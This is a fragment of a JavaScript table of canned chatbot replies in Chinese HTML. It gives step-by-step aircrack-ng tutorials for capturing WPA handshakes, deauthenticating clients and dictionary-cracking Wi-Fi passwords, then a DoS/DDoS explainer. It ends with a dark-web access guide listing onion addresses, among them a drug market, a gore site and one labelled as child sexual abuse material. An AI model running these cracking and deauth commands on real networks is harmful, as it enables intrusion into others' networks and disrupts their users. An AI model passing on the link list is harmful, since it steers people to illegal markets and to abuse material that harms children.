  <p>开始破解：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /home/kali/handshake.cap
  </code>

  <p>参数说明：</p>
  <ul>
    <li><code>-w</code>：字典路径</li>
    <li><code>-b</code>：目标路由 BSSID</li>
    <li><code>.cap</code>：抓取到的握手数据包文件</li>
  </ul>

  <p>若密码存在于字典中，破解完成后将在终端中显示。</p>

  <hr>

  <h2>附录：常见问题与优化建议</h2>

  <ul>
    <li>确认无线网卡支持 Monitor 与 Injection（可使用 <code>airmon-ng</code> 检查）</li>
    <li>如无设备连接 AP，握手无法产生，建议用手机/虚拟机连接该网络再断开</li>
    <li>若字典破解失败，可考虑使用 GPU 并发工具（如 Hashcat）</li>
  </ul>
              `
            ], 
             unlock: [""], // 解锁 我 好 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },



        "kali,wlan": {
            reply: [

              `
                <h1>Kali Linux 下使用 Aircrack-ng 破解 Wi-Fi 密码的完整流程（合法授权）</h1>

  <p>
    <strong>Aircrack-ng</strong> 是一款专业的无线网络渗透测试工具，可用于抓取 Wi-Fi 握手包并通过字典破解密码。以下是一步一步的使用流程。<br>
  </p>

  <hr>

  <h2>1. 检查无线网卡并切换为监听模式</h2>

  <p>首先查看你的无线网卡名称，输入以下命令：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
iwconfig
  </code>

  <p>例如结果中显示的是 <code>wlan0</code>，表示你的无线接口名称。</p>

  <p>将其切换到监听（monitor）模式：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airmon-ng start wlan0
  </code>

  <p>这通常会生成一个名为 <code>wlan0mon</code> 的接口，后续所有操作都基于此。</p>

  <hr>

  <h2>2. 扫描附近的 Wi-Fi 网络</h2>

  <p>使用监听模式接口扫描附近所有无线网络：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng wlan0mon
  </code>

  <p>记下目标网络的以下信息：</p>
  <ul>
    <li><strong>BSSID：</strong> 路由器的 MAC 地址</li>
    <li><strong>CHANNEL：</strong> 信道（如 1、6、11）</li>
    <li><strong>ESSID：</strong> Wi-Fi 名称</li>
  </ul>

  <hr>

  <h2>3. 锁定目标网络并捕获握手包</h2>

  <p>将目标固定下来，替换为你的 BSSID、频道和保存路径：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w /home/kali/handshake wlan0mon
  </code>

  <p>说明：</p>
  <ul>
    <li><code>--bssid</code> 后跟目标路由器 MAC</li>
    <li><code>-c</code> 为频道号</li>
    <li><code>-w</code> 为保存握手包文件名（不要加扩展名）</li>
  </ul>

  <p>保持这个窗口开启，它将持续监听是否捕获握手。</p>

  <hr>

  <h2>4. 使用 deauth 攻击强制设备重新连接（从而获得握手）</h2>

  <p>在另一个终端执行以下命令发出 deauth（断开）请求，替换为目标 BSSID：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
  </code>

  <p>此操作会向目标路由广播 10 个断开请求，促使客户端重新连接，从而在监听窗口捕获到握手数据。</p>

  <hr>

  <h2>5. 确认捕获到握手</h2>

  <p>在监听窗口（<code>airodump-ng</code>）中如果右上角出现：</p>
  <code style="background:#2e2e2e; color:#0f0; display:block; padding:10px; border-radius:6px;">
WPA handshake: AA:BB:CC:DD:EE:FF
  </code>
  <p>说明握手捕获成功，可以关闭该窗口。</p>

  <hr>

  <h2>6. 使用 Aircrack-ng 破解握手文件</h2>

  <p>准备一个字典（如 <code>/usr/share/wordlists/rockyou.txt</code>）并开始破解：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /home/kali/handshake.cap
  </code>

  <p>其中：</p>
  <ul>
    <li><code>-w</code> 是字典文件</li>
    <li><code>-b</code> 是目标 BSSID</li>
    <li><code>.cap</code> 是抓到的握手包</li>
  </ul>

  <p>破解成功后会显示 Wi-Fi 密码。</p>

  <hr>

  <h2>7. 常见问题</h2>

  <ul>
    <li>确保无线网卡支持注入模式（monitor mode）</li>
    <li>如果未成功抓握手，多尝试几次 deauth 攻击</li>
    <li>字典文件越大，破解成功率越高，但耗时更长</li>
  </ul>
              `,
              `
                <h1>在 Kali Linux 中使用 Aircrack-ng 进行 WPA/WPA2 Wi-Fi 密码渗透测试</h1>

  <p><strong>适用范围：</strong>本教程适用于持有合法授权的渗透测试人员，演示如何利用 Aircrack-ng 工具集，对无线网络进行握手捕获与密码破解操作。</p>

  <p><strong>前提条件：</strong></p>
  <ul>
    <li>Kali Linux 系统已安装</li>
    <li>具备支持监听模式（Monitor Mode）和数据包注入（Packet Injection）的无线网卡</li>
    <li>合法测试授权</li>
  </ul>

  <hr>

  <h2>步骤一：识别无线网卡并启用监听模式</h2>

  <p>使用 <code>iwconfig</code> 查看无线接口名称：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
iwconfig
  </code>

  <p>开启监听模式：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airmon-ng start wlan0
  </code>

  <p>这将创建一个新接口，例如 <code>wlan0mon</code>，用于监听 Wi-Fi 通信。</p>

  <hr>

  <h2>步骤二：扫描目标无线网络</h2>

  <p>启动监听扫描以获取附近无线网络的信息：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng wlan0mon
  </code>

  <p>记录目标网络的以下参数：</p>
  <ul>
    <li><strong>BSSID</strong>：MAC 地址</li>
    <li><strong>Channel</strong>：频道号</li>
    <li><strong>ESSID</strong>：Wi-Fi 名称</li>
  </ul>

  <hr>

  <h2>步骤三：锁定目标并捕获握手包</h2>

  <p>用下列命令锁定目标网络并将抓包保存到指定位置：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w /home/kali/handshake wlan0mon
  </code>

  <p>参数说明：</p>
  <ul>
    <li><code>--bssid</code>：目标路由器 MAC 地址</li>
    <li><code>-c</code>：信道</li>
    <li><code>-w</code>：输出文件路径（.cap 文件将自动生成）</li>
  </ul>

  <hr>

  <h2>步骤四：执行 deauthentication 攻击以强制客户端断线</h2>

  <p>为触发握手包，需主动断开连接中的客户端：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aireplay-ng --deauth 15 -a AA:BB:CC:DD:EE:FF wlan0mon
  </code>

  <p>此命令将向目标路由器广播 15 次断线请求。握手过程通常会在此时被捕获。</p>

  <hr>

  <h2>步骤五：验证握手是否成功</h2>

  <p>返回 <code>airodump-ng</code> 窗口，右上角若出现：</p>
  <code style="background:#2e2e2e; color:#0f0; display:block; padding:10px; border-radius:6px;">
WPA handshake: AA:BB:CC:DD:EE:FF
  </code>

  <p>即表示握手已成功捕获，接下来可进行密码破解。</p>

  <hr>

  <h2>步骤六：使用 Aircrack-ng 进行密码破解</h2>

  <p>准备字典文件，例如 Kali 自带的 rockyou.txt：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
  </code>

  <p>开始破解：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /home/kali/handshake.cap
  </code>

  <p>参数说明：</p>
  <ul>
    <li><code>-w</code>：字典路径</li>
    <li><code>-b</code>：目标路由 BSSID</li>
    <li><code>.cap</code>：抓取到的握手数据包文件</li>
  </ul>

  <p>若密码存在于字典中，破解完成后将在终端中显示。</p>

  <hr>

  <h2>附录：常见问题与优化建议</h2>

  <ul>
    <li>确认无线网卡支持 Monitor 与 Injection（可使用 <code>airmon-ng</code> 检查）</li>
    <li>如无设备连接 AP，握手无法产生，建议用手机/虚拟机连接该网络再断开</li>
    <li>若字典破解失败，可考虑使用 GPU 并发工具（如 Hashcat）</li>
  </ul>
              `
            ], 
             unlock: [""], // 解锁 我 好 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },




        // DoS 讲解

        "dos": {
            reply: [
                `
<p>以下是关于 DoS 和 DDoS 的讲解 <strong>DDoS（分布式拒绝服务攻击）</strong> 和 <strong>DoS（拒绝服务攻击）</strong>，并附上它们的攻击结构介绍。</p>
  <hr>
  <h2 style="color: #e1e1e1e2;">一、什么是 DoS 和 DDoS？</h2>
  <h3>1.1 DoS（Denial of Service，拒绝服务攻击）</h3>
  <p>DoS 是指攻击者通过发送大量请求或利用系统漏洞，使目标服务器、网络或服务无法正常提供服务给正常用户。</p>
  <h4>特点：</h4>
  <ul>
    <li>来自单一来源（单个主机或 IP）</li>
    <li>通过耗尽资源（如 CPU、内存、带宽）或使服务崩溃来中断服务</li>
    <li>容易被识别和拦截</li>
  </ul>
  <h4>常见方法：</h4>
  <ul>
    <li><strong>洪水攻击（Flooding）</strong>：发送大量请求包，如 ICMP Flood、UDP Flood、SYN Flood 等</li>
    <li><strong>漏洞攻击</strong>：利用服务器软件的漏洞，比如 Ping of Death、Teardrop 等</li>
    <li><strong>逻辑攻击</strong>：例如发送畸形的 HTTP 请求让 Web 服务器崩溃</li>
  </ul>

  <hr>
  <h3>1.2 DDoS（Distributed Denial of Service，分布式拒绝服务攻击）</h3>
  <p>DDoS 是 DoS 的升级版。它不是由单一主机发动攻击，而是通过大量被控制的“肉鸡”（受感染的计算机）组成的 <strong>僵尸网络（Botnet）</strong> 同时向目标发起攻击。</p>
  <h4>特点：</h4>
  <ul>
    <li><strong>攻击源分布广泛</strong>（上千甚至上万台机器）</li>
    <li>更难防御和追踪</li>
    <li>可同时发起多种类型的攻击</li>
    <li>对目标造成更严重的破坏</li>
  </ul>
  <h4>举个例子：</h4>
  <p>一台主机发送 10,000 个请求可能会被防火墙拦截。但如果 10,000 台被控制的电脑每台只发一个请求，那么这些请求看起来像“正常流量”，更难检测和防御。</p>

  <hr>
  <h2  style="color: #e1e1e1e2;">二、攻击结构介绍</h2>
  <h3>2.1 DoS 攻击结构图（简单）</h3>
  <pre>
+-------------+       大量请求       +------------------+
| 攻击者主机  | ------------------> | 目标服务器或服务 |
+-------------+                     +------------------+
  </pre>
  <ul>
    <li>攻击者直接向目标发起请求，尝试耗尽其资源。</li>
  </ul>

  <hr>
  <h3>2.2 DDoS 攻击结构图（复杂）</h3>
  <pre>
                         控制命令
                      +-------------+
                      | 攻击者主控台 |
                      +-------------+
                             |
                             ↓
                    +-------------------+
                    | C&C（指挥控制服务器） |
                    +-------------------+
                             ↓
             控制           ↓           控制
         +--------+    +--------+    +--------+
         | 僵尸主机 |    | 僵尸主机 |    | 僵尸主机 |
         +--------+    +--------+    +--------+
              \            |             /
               \           ↓            /
                  大量并发请求流量
                         ↓
                 +------------------+
                 | 目标服务器或服务 |
                 +------------------+
  </pre>
  <h4>说明：</h4>
  <ul>
    <li><strong>攻击者主控台</strong>：发起指令，不直接参与攻击。</li>
    <li><strong>C&C 服务器（Command & Control）</strong>：向受控机器发布攻击命令。</li>
    <li><strong>僵尸主机（Bot）</strong>：已被感染并控制的主机，负责发起攻击。</li>
    <li><strong>目标服务器</strong>：受到集中攻击的服务或网站。</li>
  </ul>

  <hr>
  <h2  style="color: #e1e1e1e2;">三、DDoS 的攻击类型</h2>
  <h3>3.1 网络层攻击（第3层和第4层）</h3>
  <ul>
    <li><strong>SYN Flood</strong>：伪造 TCP 连接请求，消耗服务器连接资源</li>
    <li><strong>UDP Flood</strong>：发送大量 UDP 包，造成目标处理资源耗尽</li>
    <li><strong>ICMP Flood</strong>：Ping 洪水，淹没网络带宽</li>
  </ul>
  <h3>3.2 应用层攻击（第7层）</h3>
  <ul>
    <li><strong>HTTP Flood</strong>：大量发送看似合法的 HTTP 请求，占用 Web 服务器资源</li>
    <li><strong>Slowloris</strong>：发送不完整的 HTTP 请求，占用连接，导致服务器资源耗尽</li>
    <li><strong>DNS Query Flood</strong>：大量请求域名解析，压垮 DNS 服务</li>
  </ul>

  <hr>
  <h2  style="color: #e1e1e1e2;">四、防御手段</h2>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>层级</th>
        <th>防御方式</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>网络层</td>
        <td>黑名单、ACL、流量清洗、防火墙</td>
      </tr>
      <tr>
        <td>传输层</td>
        <td>SYN Cookie、限速、连接池控制</td>
      </tr>
      <tr>
        <td>应用层</td>
        <td>验证码、WAF（Web 应用防火墙）、反爬虫策略</td>
      </tr>
      <tr>
        <td>全局层</td>
        <td>CDN、云防护服务、DDoS 防御平台</td>
      </tr>
    </tbody>
  </table>

  <hr>
  <h2  style="color: #e1e1e1e2;">五、总结</h2>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>项目</th>
        <th>DoS</th>
        <th>DDoS</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>来源</td>
        <td>单一主机</td>
        <td>多个分布式主机</td>
      </tr>
      <tr>
        <td>威胁程度</td>
        <td>中</td>
        <td>高</td>
      </tr>
      <tr>
        <td>防御难度</td>
        <td>相对容易</td>
        <td>更复杂</td>
      </tr>
      <tr>
        <td>典型使用</td>
        <td>初级攻击</td>
        <td>大规模攻击</td>
      </tr>
    </tbody>
  </table>
                `,
                `<p>以下是一份带有专业标题和详尽讲解的技术文档，涵盖 DoS 与 DDoS 的定义、攻击结构、关键技术与防御策略。</p>
  <hr>
  <h1>一、引言</h1>
  <p>拒绝服务攻击（DoS/DDoS）已成为网络安全领域的常见威胁。本文旨在通过专业化的视角，系统化地阐述 DoS 与 DDoS 的攻击原理、结构模型及防御要点，为安全架构师与运维工程师提供参考。</p>
  <hr>
  <h1>二、术语与定义</h1>
  <ul>
    <li>
      <strong>DoS（Denial of Service）</strong><br>
      单源发起，通过消耗目标系统资源或利用协议漏洞，使其无法对合法用户提供正常服务。
    </li>
    <li>
      <strong>DDoS（Distributed Denial of Service）</strong><br>
      分布式拒绝服务攻击，借助大量被感染的“僵尸主机”（Bot），从多源对目标发动协同攻击，显著提升攻击强度和隐蔽性。
    </li>
  </ul>
  <hr>
  <h1>三、DoS 攻击结构与技术细节</h1>
  <h2  style="color: #e1e1e1e2;">3.1 攻击结构图</h2>
  <pre>
┌───────────┐      构造/发送异常流量       ┌──────────────┐
│ 攻击者主机 │ ────────────────────────> │ 目标服务器/网络 │
└───────────┘                             └──────────────┘
  </pre>
  <h2  style="color: #e1e1e1e2;">3.2 关键要素</h2>
  <ol>
    <li>
      <strong>攻击者主机（Attacker）</strong>
      <ul>
        <li>常为单台物理机、VPS 或云实例；</li>
        <li>使用工具（如 hping3、LOIC）伪造或洪泛数据包。</li>
      </ul>
    </li>
    <li>
      <strong>异常流量（Attack Traffic）</strong>
      <ul>
        <li><strong>网络层洪水</strong>：SYN Flood、UDP Flood、ICMP Flood；</li>
        <li><strong>畸形分片</strong>：Ping of Death、Teardrop 等。</li>
      </ul>
    </li>
    <li>
      <strong>目标系统（Victim）</strong>
      <ul>
        <li>网络带宽被淹没；</li>
        <li>半开 TCP 连接队列耗尽；</li>
        <li>系统 CPU/内存资源被占满。</li>
      </ul>
    </li>
  </ol>
  <h2  style="color: #e1e1e1e2;">3.3 典型攻击方式</h2>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>类型</th>
        <th>描述</th>
        <th>防御要点</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>SYN Flood</td>
        <td>大量伪造 SYN 包发往目标，耗尽半开连接资源</td>
        <td>启用 SYN Cookie；调整 TCP backlog；限速</td>
      </tr>
      <tr>
        <td>UDP Flood</td>
        <td>向随机或特定端口发送海量 UDP 包，引发 ICMP “端口不可达”反馈</td>
        <td>端口 ACL；流量限速；黑洞路由</td>
      </tr>
      <tr>
        <td>ICMP Flood</td>
        <td>连续发送 ICMP Echo 请求，淹没带宽</td>
        <td>限制 ICMP；速率限制；流量清洗</td>
      </tr>
      <tr>
        <td>Ping of Death</td>
        <td>利用超长 IP 分片包触发目标系统重组缺陷，导致崩溃</td>
        <td>更新系统补丁；丢弃异常分片</td>
      </tr>
      <tr>
        <td>Teardrop</td>
        <td>发送重叠 IP 分片包，引发内存越界</td>
        <td>升级内核；启用分片校验</td>
      </tr>
    </tbody>
  </table>
  <hr>
  <h1>四、DDoS 攻击体系与放大技术</h1>
  <h2  style="color: #e1e1e1e2;">4.1 攻击体系结构</h2>
  <pre>
┌───────────┐        C&C 通道         ┌──────────────┐
│ 攻击者主控 │ ────────────────────> │ C&C 服务器   │
└───────────┘                         └──────────────┘
                                        │
                     ┌──────────────────┼──────────────────┐
                     │                  │                  │
               ┌──────────┐        ┌──────────┐        ┌──────────┐
               │ Bot ①    │        │ Bot ②    │  …     │ Bot Ⅹ     │
               └──────────┘        └──────────┘        └──────────┘
                     \                  |                 /
                      \                 ↓                /
                    大规模并发流量（TCP/UDP/ICMP/HTTP 等）
                                     │
                             ┌──────────────────┐
                             │ 目标服务器/网络   │
                             └──────────────────┘
  </pre>
  <h2  style="color: #e1e1e1e2;">4.2 核心组件</h2>
  <ol>
    <li>
      <strong>攻击者主控（Attacker Controller）</strong><br>
      制定攻击方案，选定目标与持续时间，并下发执行指令。
    </li>
    <li>
      <strong>C&C（Command & Control）服务器</strong><br>
      通过 IRC、HTTP(S) 或 P2P 协议与 Bot 通信，分发任务、收集执行结果。
    </li>
    <li>
      <strong>僵尸网络（Botnet）</strong><br>
      数千至数百万台受控主机或 IoT 设备，定时向 C&C 请求指令并执行攻击。
    </li>
    <li>
      <strong>流量载荷（Attack Payload）</strong><br>
      支持混合攻击：网络层 Flood、协议放大（DNS/NTP）、应用层请求（HTTP Flood、Slowloris）。
    </li>
  </ol>
  <h2  style="color: #e1e1e1e2;">4.3 放大（Amplification）攻击</h2>
  <ul>
    <li>
      <strong>原理</strong>：利用开放解析或回声服务，伪造源 IP 为目标，放大响应流量。
    </li>
    <li>
      <strong>典型技术</strong>：
      <ul>
        <li><strong>DNS 放大</strong>：小请求（≈60 B）换取大响应（≈4 KB），放大因子可达 50–70×。</li>
        <li><strong>NTP 放大</strong>：monlist 命令响应大，放大因子可达 200×。</li>
        <li><strong>Chargen 放大</strong>：利用字符生成服务，响应大于请求。</li>
      </ul>
    </li>
  </ul>
  <hr>
  <h1>五、防御与缓解策略</h1>
  <h2  style="color: #e1e1e1e2;">5.1 流量监测与取证</h2>
  <ul>
    <li><strong>NetFlow/sFlow/IPFIX</strong>：实时分析五元组流量，识别异常峰值。</li>
    <li><strong>深度包检测（DPI）</strong>：基于特征的分层检测，区分合法请求与攻击流量。</li>
    <li><strong>日志与抓包</strong>：保留 pcap、日志，支持溯源与后期取证。</li>
  </ul>
  <h2  style="color: #e1e1e1e2;">5.2 分层防御体系</h2>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>防御层级</th>
        <th>技术手段</th>
        <th>实施要点</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>边缘网络层</td>
        <td>黑洞路由（Null Routing）、接入 ACL、速率限制</td>
        <td>在 ISP/骨干侧即刻丢弃恶意流量</td>
      </tr>
      <tr>
        <td>传输层</td>
        <td>SYN Cookie、TCP 连接限速、流量清洗</td>
        <td>动态调节 TCP 队列；分布式速率控制</td>
      </tr>
      <tr>
        <td>应用层</td>
        <td>WAF、CAPTCHA、行为指纹</td>
        <td>对高频请求加验；拦截畸形 HTTP 请求</td>
      </tr>
      <tr>
        <td>云端/CDN</td>
        <td>Anycast 分发、弹性扩容、托管清洗服务</td>
        <td>弹性吸收攻击；多点分流与清洗</td>
      </tr>
    </tbody>
  </table>
  <h2  style="color: #e1e1e1e2;">5.3 自动化响应</h2>
  <ol>
    <li><strong>阈值告警</strong>：设置带宽、连接数及资源占用报警。</li>
    <li><strong>脚本化防御</strong>：基于报警自动触发黑洞路由或流量重定向。</li>
    <li><strong>可视化监控</strong>：仪表盘实时展示流量状态、攻击来源分布。</li>
  </ol>
  <hr>
  <h1>六、案例剖析</h1>
  <ul>
    <li>
      <strong>GitHub Memcached 放大攻击（2018）</strong><br>
      流量峰值 1.35 Tbps，利用数千台开放的 Memcached 服务器放大因子达 400×，造成全球用户访问受阻。
    </li>
    <li>
      <strong>Mirai IoT 僵尸网络（2016）</strong><br>
      感染百万级 IoT 设备，针对 Dyn DNS 发起混合层 3/4/7 攻击，导致主要互联网服务大规模中断。
    </li>
  </ul>
  <hr>
  <h1>七、结语</h1>
  <p>DoS 与 DDoS 攻击技术日益演进，从单层洪水到多层放大与应用层隐蔽攻击，防御也须从网络边缘到云端协同，通过自动化与智能化手段构建全链路防护，以应对日益复杂的威胁格局。</p>
                `
            ], 
             unlock: [""], // 解锁 我 好 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },






        "暗网": {
            reply: [
                `<h1 style="color: #e1e1e1e2;">访问暗网需要谨慎行事</h1>   <p style="color: #e1e1e1e2;">以下是详细的步骤和每个步骤的作用，帮助您安全地访问暗网：</p>    <h2 style="color: #e1e1e1e2;">1. 下载并安装 VPN（虚拟专用网络）：</h2>   <p style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">作用：</b> VPN 能加密您的互联网流量，隐藏您的真实 IP 地址，提供额外的隐私和安全层。</p>   <p style="color: #e1e1e1e2;">ZoogVPN | Fast & Trusted VPN Provider<br style="color: #e1e1e1e2;">+1<br style="color: #e1e1e1e2;">PureVPN<br style="color: #e1e1e1e2;">+1</p>    <h3 style="color: #e1e1e1e2;">步骤：</h3>   <ul style="color: #e1e1e1e2;">     <li><b style="color: #e1e1e1e2;">选择可靠的 VPN 服务商：</b> 选择信誉良好的 VPN 服务，例如 ExpressVPN 或 NordVPN。</li>     <li><b style="color: #e1e1e1e2;">下载 VPN 客户端：</b> 前往所选 VPN 服务商的官方网站，下载适用于您设备的 VPN 客户端。</li>     <ul>       <li>Windows 用户：下载 Windows 版 VPN 客户端。</li>       <li>macOS 用户：下载 macOS 版 VPN 客户端。</li>       <li>Android 用户：在 Google Play 商店搜索并下载 VPN 应用。</li>       <li>iOS 用户：在 App Store 搜索并下载 VPN 应用。</li>     </ul>     <li><b style="color: #e1e1e1e2;">安装并登录 VPN 客户端：</b> 按照提示完成安装，并使用您的账户信息登录。</li>     <li><b style="color: #e1e1e1e2;">连接到 VPN 服务器：</b> 选择一个服务器（建议选择与您所在地理位置不同的服务器），点击连接。</li>   </ul>    <h2 style="color: #e1e1e1e2;">2. 下载并安装 Tor 浏览器：</h2>   <p style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">作用：</b> Tor 浏览器通过多层加密和中继节点，使您的网络活动匿名化，是访问暗网的主要工具。</p>   <p style="color: #e1e1e1e2;">NordVPN</p>    <h3 style="color: #e1e1e1e2;">步骤：</h3>   <ul style="color: #e1e1e1e2;">     <li><b style="color: #e1e1e1e2;">前往 Tor 官方网站：</b> 访问 Tor 浏览器下载页面。</li>     <li><b style="color: #e1e1e1e2;">选择适合您操作系统的版本：</b></li>     <ul>       <li>Windows 用户：下载 Windows 版 .exe 安装文件。</li>       <li>macOS 用户：下载 macOS 版 .dmg 安装文件。</li>       <li>Linux 用户：下载 Linux 版 .tar.xz 安装文件。</li>       <li>Android 用户：在 Google Play 商店下载 Android 版 Tor 浏览器。</li>     </ul>     <li><b style="color: #e1e1e1e2;">安装 Tor 浏览器：</b> 下载完成后，运行安装文件，按照提示完成安装过程。</li>   </ul>   <p style="color: #e1e1e1e2;">tb-manual.torproject.org<br style="color: #e1e1e1e2;">+4<br style="color: #e1e1e1e2;">Mastodon hosted on mastodon.social<br style="color: #e1e1e1e2;">+4<br style="color: #e1e1e1e2;">tb-manual.torproject.org<br style="color: #e1e1e1e2;">+4</p>    <h2 style="color: #e1e1e1e2;">3. 配置和使用 Tor 浏览器：</h2>   <p style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">作用：</b> 正确配置 Tor 浏览器，确保匿名性和安全性。</p>    <h3 style="color: #e1e1e1e2;">步骤：</h3>   <ul style="color: #e1e1e1e2;">     <li><b style="color: #e1e1e1e2;">启动 Tor 浏览器：</b> 安装完成后，打开 Tor 浏览器，等待其连接到 Tor 网络。</li>     <li><b style="color: #e1e1e1e2;">调整安全设置：</b></li>     <ul>       <li>点击浏览器右上角的盾牌图标，选择“高级安全设置”。</li>       <li>将安全级别设置为“安全”或“更安全”，以减少潜在的安全风险。</li>     </ul>     <li><b style="color: #e1e1e1e2;">避免使用浏览器插件：</b> Tor 浏览器会拦截 Flash、RealPlayer 和 QuickTime 等插件，因为这些插件可能泄露您的 IP 地址。</li>     <li><b style="color: #e1e1e1e2;">不使用 BT 下载：</b> 在 Tor 网络上使用 BT 下载可能会暴露您的真实 IP 地址，建议避免。</li>   </ul>    <h2 style="color: #e1e1e1e2;">4. 访问暗网网站：</h2>   <p style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">作用：</b> 通过 Tor 浏览器访问以 .onion 结尾的暗网网站。</p>   <p style="color: #e1e1e1e2;">YouTube</p>    <h3 style="color: #e1e1e1e2;">步骤：</h3>   <ul style="color: #e1e1e1e2;">     <li><b style="color: #e1e1e1e2;">获取可信的 .onion 地址：</b> 可以通过以下方式获取合法的 .onion 网站地址：</li>     <ul>       <li><b style="color: #e1e1e1e2;">The Hidden Wiki：</b> 这是一个暗网网站目录，提供各种 .onion 网站的链接。</li>       <li><b style="color: #e1e1e1e2;">DuckDuckGo：</b> 这是一个注重隐私的搜索引擎，其暗网版本可用于搜索 .onion 网站。</li>     </ul>     <li><b style="color: #e1e1e1e2;">在 Tor 浏览器中输入 .onion 地址：</b> 在地址栏输入获取的 .onion 地址，按回车访问。</li>   </ul>    <h2 style="color: #e1e1e1e2;">5. 安全使用暗网的注意事项：</h2>   <p style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">作用：</b> 确保在访问暗网时，最大程度地保护个人隐私和安全。</p>    <h3 style="color: #e1e1e1e2;">注意事项：</h3>   <ul style="color: #e1e1e1e2;">     <li><b style="color: #e1e1e1e2;">不提供个人信息：</b> 在暗网中，避免输入任何个人身份信息，如姓名、地址、电话号码等。</li>     <li><b style="color: #e1e1e1e2;">避免下载文件：</b> 暗网上的文件可能包含恶意软件，避免下载和打开未知文件。</li>     <li><b style="color: #e1e1e1e2;">定期更新软件：</b> 确保您的 VPN 和 Tor 浏览器是最新版本，以获得最新的安全补丁。</li>     <li><b style="color: #e1e1e1e2;">了解并遵守法律：</b> 访问暗网本身并不违法，但暗网上存在大量非法内容和活动。务必确保您的行为合法，避免参与任何非法活动。</li>   </ul>    <p style="color: #e1e1e1e2;">通过以上详细步骤和注意事项，您可以更安全地访问暗网。但请始终保持警惕，确保自身安全和合法性。</p> <br><br><h2 style="color: #e1e1e1e2;"> 以下是使用TOR访问的暗网网址，请注意，不要在里面输入任何敏感信息，并且一定要开启VPN隐藏IP 信息等。</h2><br><h1 style="color: #e1e1e1e2;">暗网网址列表</h1>  <h2 style="color: #e1e1e1e2;">主要网址</h2> <ul> <li style="color: #e1e1e1e2;">1.<a href="http://newmap.norsecorp.com/" style="color: #e1e1e1e2;">http://newmap.norsecorp.com/</a> norse attack map</li> <li style="color: #e1e1e1e2;">2.<a href="http://22u75kqyl666joi2.onion/" style="color: #e1e1e1e2;">http://22u75kqyl666joi2.onion/</a> 暗网中文论坛</li> <li style="color: #e1e1e1e2;">3.<a href="http://reloadedudjtjvxr.onion/road.php" style="color: #e1e1e1e2;">http://reloadedudjtjvxr.onion/road.php</a> 丝绸之路3.0</li> <li style="color: #e1e1e1e2;">4.<a href="http://www.normalpornfornormalpeople.com/" style="color: #e1e1e1e2;">http://www.normalpornfornormalpeople.com/</a> normal人体试验血腥网址（需要账号）</li> <li style="color: #e1e1e1e2;">5.<a href="http://prnstmrpfkgkaw5v.onion/" style="color: #e1e1e1e2;">http://prnstmrpfkgkaw5v.onion/</a> 小福利</li> <li style="color: #e1e1e1e2;">6.<a href="http://iuhcjx6fpeafstuu.onion/" style="color: #e1e1e1e2;">http://iuhcjx6fpeafstuu.onion/</a> Scream bitch！</li> <li style="color: #e1e1e1e2;">7.<a href="http://6soqvgf7mrjc7w3j.onion/bbs/index.php" style="color: #e1e1e1e2;">http://6soqvgf7mrjc7w3j.onion/bbs/index.php</a> 114中文论坛</li> <li style="color: #e1e1e1e2;">8.<a href="http://6soqvgf7mrjc7w3j.onion/chat/blab73/index.php" style="color: #e1e1e1e2;">http://6soqvgf7mrjc7w3j.onion/chat/blab73/index.php</a> 114聊天室 （马克斯AKeD jasonlee1573）</li> <li style="color: #e1e1e1e2;">9.<a href="http://xmi6ngumdv6ohjbm.onion/" style="color: #e1e1e1e2;">http://xmi6ngumdv6ohjbm.onion/</a> 天堂庄园CP网址</li> <li style="color: #e1e1e1e2;">10.<a href="http://smok6do2tvv6ekv2.onion/" style="color: #e1e1e1e2;">http://smok6do2tvv6ekv2.onion/</a> SMOKEBLES</li> </ul>  <h2 style="color: #e1e1e1e2;">维基和搜索引擎</h2> <ul> <li style="color: #e1e1e1e2;">11.<a href="http://kpvz7kpmcmne52qf.onion/wiki/index.php/Main_Page" style="color: 